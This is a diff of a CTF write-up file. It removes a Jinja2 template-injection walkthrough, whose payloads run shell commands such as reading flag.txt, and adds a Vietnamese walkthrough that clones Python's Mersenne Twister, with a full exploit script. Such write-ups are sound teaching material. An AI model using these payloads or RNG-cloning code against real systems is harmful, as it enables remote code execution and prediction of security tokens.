@@ -1,98 +1,189 @@
-# OTP - Server Side Template Injection (SSTI)
+# Roulette - Crypto CTF Challenge Writeup
 
-## Challenge Info
-- **URL:** http://chall.0xfun.org:30233/
-- **Category:** Web
-- **Description:** Just a simple service made using Server Side Rendering.
+## Thông tin challenge
 
-## Solution
+- **Tên:** Roulette
+- **Thể loại:** Crypto
+- **Server:** `nc chall.0xfun.org 45386`
+- **Flag:** `0xfun{m3rs3nn3_tw1st3r_unr4v3l3d}`
 
-### Step 1: Reconnaissance
+## Phân tích source code
 
-The challenge presents a simple "Greeting Service" with a form that takes a name input:
+```python
+import random
 
-```html
-<form method="POST">
-    <input type="text" name="name" placeholder="Enter your name" required>
-    <input type="submit" value="Greet Me!">
-</form>
+class MersenneOracle:
+    def __init__(self):
+        self.mt = random.Random()
+        self.seed = random.randint(0, 2**32 - 1)
+        self.mt.seed(self.seed)
+
+    def spin(self):
+        raw = self.mt.getrandbits(32)
+        obfuscated = raw ^ 0xCAFEBABE
+        return obfuscated
 ```
 
-Submitting `test` returns `test` directly, indicating the input is reflected in the response.
+### Phân tích:
+1. Server sử dụng **Mersenne Twister (MT19937)** - thuật toán sinh số ngẫu nhiên mặc định của Python
+2. Mỗi lần `spin`, server trả về giá trị `raw ^ 0xCAFEBABE`
+3. Server có 2 lệnh: `spin` (lấy số ngẫu nhiên) và `predict` (dự đoán 10 số tiếp theo)
 
-### Step 2: Identifying SSTI
+## Lỗ hổng
 
-Since the challenge mentions "Server Side Rendering," I tested for Server-Side Template Injection (SSTI).
+**Mersenne Twister có thể bị clone hoàn toàn nếu biết 624 outputs liên tiếp.**
 
-**Test payload:**
-```
-{{7*7}}
-```
+MT19937 có state gồm 624 số 32-bit. Sau khi quan sát 624 outputs, ta có thể:
+1. **Reverse tempering** để lấy lại state gốc
+2. **Clone state** vào một MT instance mới
+3. **Dự đoán** tất cả các số tiếp theo
 
-**Response:**
-```
-49
-```
+## Giải pháp
 
-The server evaluated `7*7` and returned `49`, confirming Jinja2 SSTI vulnerability.
+### Bước 1: Thu thập 624 outputs
 
-### Step 3: Confirming Flask/Jinja2
-
-Accessing the Flask config object:
-
-```
-{{config}}
-```
-
-Response confirmed Flask configuration, revealing this is a Flask application using Jinja2 templates.
-
-### Step 4: Achieving RCE
-
-Using Jinja2's `cycler` object to access Python's `os` module:
-
-```
-{{cycler.__init__.__globals__.os.popen('id').read()}}
+```python
+outputs = []
+for i in range(624):
+    s.send(b'spin\n')
+    data = s.recv(1024)
+    obfuscated = int(data.strip())
+    raw = obfuscated ^ 0xCAFEBABE  # Reverse XOR
+    outputs.append(raw)
 ```
 
-**Response:**
-```
-uid=0(root) gid=0(root) groups=0(root)
-```
+### Bước 2: Untemper function
 
-RCE achieved as root!
-
-### Step 5: Finding the Flag
-
-Listed files in `/app`:
+MT19937 áp dụng **tempering** trước khi output:
 ```
-{{cycler.__init__.__globals__.os.popen('ls -la /app').read()}}
+y ^= y >> 11
+y ^= (y << 7) & 0x9D2C5680
+y ^= (y << 15) & 0xEFC60000
+y ^= y >> 18
 ```
 
-Found `flag.txt`, then read it:
+Ta cần reverse lại:
+
+```python
+def untemper(y):
+    # Undo y ^= y >> 18
+    y ^= y >> 18
+    
+    # Undo y ^= (y << 15) & 0xEFC60000
+    y ^= (y << 15) & 0xEFC60000
+    
+    # Undo y ^= (y << 7) & 0x9D2C5680
+    for i in range(7):
+        y ^= ((y << 7) & 0x9D2C5680)
+    
+    # Undo y ^= y >> 11
+    for i in range(3):
+        y ^= y >> 11
+    
+    return y & 0xFFFFFFFF
 ```
-{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}
+
+### Bước 3: Clone MT state
+
+```python
+def clone_mt(outputs):
+    state = [untemper(o) for o in outputs[:624]]
+    state.append(624)  # index = 624 sau khi generate 624 số
+    return (3, tuple(state), None)
+
+mt = random.Random()
+mt.setstate(clone_mt(outputs))
 ```
 
-## Flag
+### Bước 4: Dự đoán 10 số tiếp theo
+
+```python
+predictions = []
+for _ in range(10):
+    next_raw = mt.getrandbits(32)
+    predictions.append(next_raw)
+
+# Gửi predictions
+prediction_str = ' '.join(map(str, predictions))
+s.send(f'{prediction_str}\n'.encode())
 ```
-0xfun{Server_Side_Template_Injection_Awesome}
+
+## Full exploit
+
+```python
+#!/usr/bin/env python3
+import socket
+import random
+
+def untemper(y):
+    y ^= y >> 18
+    y ^= (y << 15) & 0xEFC60000
+    for i in range(7):
+        y ^= ((y << 7) & 0x9D2C5680)
+    for i in range(3):
+        y ^= y >> 11
+    return y & 0xFFFFFFFF
+
+def clone_mt(outputs):
+    state = [untemper(o) for o in outputs[:624]]
+    state.append(624)
+    return (3, tuple(state), None)
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('chall.0xfun.org', 45386))
+    s.settimeout(10)
+    s.recv(1024)
+    
+    # Thu thập 624 outputs
+    outputs = []
+    for i in range(624):
+        s.send(b'spin\n')
+        data = b''
+        while b'\n' not in data:
+            data += s.recv(1024)
+        line = data.split(b'\n')[0].strip().decode()
+        if '>' in line:
+            line = line.replace('>', '').strip()
+        obfuscated = int(line)
+        raw = obfuscated ^ 0xCAFEBABE
+        outputs.append(raw)
+    
+    # Clone MT state
+    mt = random.Random()
+    mt.setstate(clone_mt(outputs))
+    
+    # Dự đoán 10 số tiếp theo
+    predictions = [mt.getrandbits(32) for _ in range(10)]
+    
+    # Gửi predict
+    s.send(b'predict\n')
+    s.recv(1024)
+    
+    prediction_str = ' '.join(map(str, predictions))
+    s.send(prediction_str.encode() + b'\n')
+    
+    print(s.recv(4096).decode())
+    s.close()
+
+if __name__ == "__main__":
+    main()
 ```
 
-## Exploit One-Liner
+## Kết quả
 
-```bash
-curl -s -X POST --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}" "http://chall.0xfun.org:30233/"
+```
+PERFECT! You've untwisted the Mersenne Oracle!
+0xfun{m3rs3nn3_tw1st3r_unr4v3l3d}
 ```
 
-## Key Concepts
+## Kiến thức học được
 
-- **SSTI (Server-Side Template Injection):** Occurs when user input is embedded directly into a template without proper sanitization
-- **Jinja2:** Python templating engine used by Flask
-- **Exploit Chain:** `cycler` → `__init__` → `__globals__` → `os` → `popen()` → RCE
+1. **Mersenne Twister không an toàn cho cryptography** - Chỉ cần 624 outputs là có thể clone hoàn toàn
+2. **Tempering có thể reverse** - Các phép XOR và shift đều có thể đảo ngược
+3. **Không dùng `random` cho security** - Nên dùng `secrets` hoặc `os.urandom()` thay thế
 
-## Prevention
+## Tham khảo
 
-1. Never pass user input directly to `render_template_string()`
-2. Use `render_template()` with separate template files
-3. Sanitize/escape user input before rendering
-4. Use sandboxed Jinja2 environment
+- [Mersenne Twister - Wikipedia](https://en.wikipedia.org/wiki/Mersenne_Twister)
+- [Cracking Random Number Generators](https://jazzy.id.au/2010/09/22/cracking_random_number_generators_part_3.html)
